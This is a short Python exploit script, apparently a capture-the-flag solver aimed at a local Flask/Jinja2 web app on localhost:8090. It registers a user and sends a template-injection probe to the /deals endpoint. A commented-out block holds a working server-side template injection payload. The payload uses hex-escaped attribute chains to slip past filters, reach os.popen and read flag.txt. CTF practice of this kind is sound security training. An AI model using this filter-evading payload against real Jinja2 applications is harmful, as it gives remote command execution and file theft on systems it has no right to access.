#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re

def main():
    url = "http://localhost:8090"
    flag_regex = re.compile("(InfoSec{.+[^}]})")

    # Create new session
    session = requests.Session()

    # Target user
    first_name = "abidan"
    last_name = "brito"
    username = "random_email@gmail.com"
    password = "pass123*"

    # Create user
    register_data = {'register_firstname': first_name, 'register_lastname': last_name, 
                     'register_email': username, 'register_password': password}
    session.post(url + "/register", data = register_data)
        
    # SSTI Jinja2
    #template_injection = f"Location={{{{__code__('flag[dot]txt')__code__}}}}&Price=Price+Range"
    template_injection = {'Location': f"{{{{'abidan'}}}}", 'Price': 250}
    response = session.get(url + "/deals", data = template_injection)
    print(response.text)


    # NOTE(abi): try this solution instead.
    # import urllib.parse

    # hacky_url_param = r"{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__\x69\x6D\x70\x6F\x72\x74__')('\x6F\x73')|attr('\x70\x6F\x70\x65\x6E')('cat flag\x2Etxt')|attr('read')()}}"
    # payload = {"Location": hacky_url_param, "Price": "100"}

    # s = requests.Session()
    # res = s.get(url + '/deals', params=payload)
    # flag_regex = re.compile("(InfoSec{.+[^}]})")
    # flag = re.findall(flag_regex, res.text)
    # flag = flag[0]
    # print(flag)

# ------------------------------------------------------------------------------
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass


